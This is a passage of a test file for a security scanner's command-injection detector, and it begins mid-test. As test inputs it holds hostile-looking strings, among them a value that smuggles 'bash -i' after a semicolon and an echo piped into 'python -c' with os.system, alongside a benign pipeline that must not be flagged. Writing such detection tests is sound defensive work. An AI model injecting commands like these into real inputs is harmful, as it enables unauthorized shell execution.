    const r = scanner.scan('input; bash -i', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'COMMAND_INJECTION')).toBe(true);
  });

  it('detects pipe to python', () => {
    const r = scanner.scan('echo payload | python -c "import os; os.system(x)"', { detectors: ['code_safety'] });
    expect(r.detections.some(d => d.subType === 'COMMAND_INJECTION')).toBe(true);
  });

  it('does NOT flag a normal bash pipeline', () => {
    const r = scanner.scan('ls -la | grep ".ts"', { detectors: ['code_safety'] });
    expect(r.detections.filter(d => d.subType === 'COMMAND_INJECTION')).toHaveLength(0);
  });
});
